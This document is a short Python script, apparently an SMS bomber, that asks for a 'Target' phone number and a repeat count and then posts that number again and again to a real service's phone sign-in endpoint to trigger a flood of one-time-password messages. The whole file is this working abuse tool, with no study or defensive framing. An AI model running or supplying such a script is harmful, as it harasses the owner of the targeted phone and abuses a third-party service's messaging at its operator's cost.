import requests
import os
import time



url = "https://globalapi.pointspot.co/papi/oauth2/signinWithPhone"

def send(phone: str , jam: int):
	payloads = {"phoneNumber": f"+66{phone[1:]}"}
	for i in range(jam):
		r = requests.post(url, data=payloads)
		print(f"\033[1;92msend otp to {phone} success")
		time.sleep(1)
		
os.system('clear')
print("")
phone_input = input("Target : ")
jam_input = int(input("times : "))

send(phone=phone_input,jam=jam_input)
